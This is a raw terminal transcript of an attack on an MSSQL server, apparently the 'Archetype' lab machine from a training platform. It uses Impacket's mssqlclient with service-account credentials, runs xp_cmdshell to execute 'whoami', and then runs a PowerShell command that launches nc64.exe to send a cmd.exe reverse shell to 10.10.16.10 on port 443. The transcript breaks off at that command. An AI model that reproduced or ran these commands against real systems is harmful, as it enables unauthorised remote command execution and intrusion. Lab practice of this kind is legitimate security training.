$ python /usr/share/impacket/examples/mssqlclient.py ARCHETYPE/sql_svc@10.129.241.22 -windows-auth
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)
[!] Press help for extra shell commands
SQL> help

     lcd {path}                 - changes the current local directory to {path}
     exit                       - terminates the server process (and this session)
     enable_xp_cmdshell         - you know what it means
     disable_xp_cmdshell        - you know what it means
     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
     ! {cmd}                    - executes a local shell cmd

SQL> xp_cmdshell "whoami"
output

--------------------------------------------------------------------------------

archetype\sql_svc

NULL

SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.16.10 443"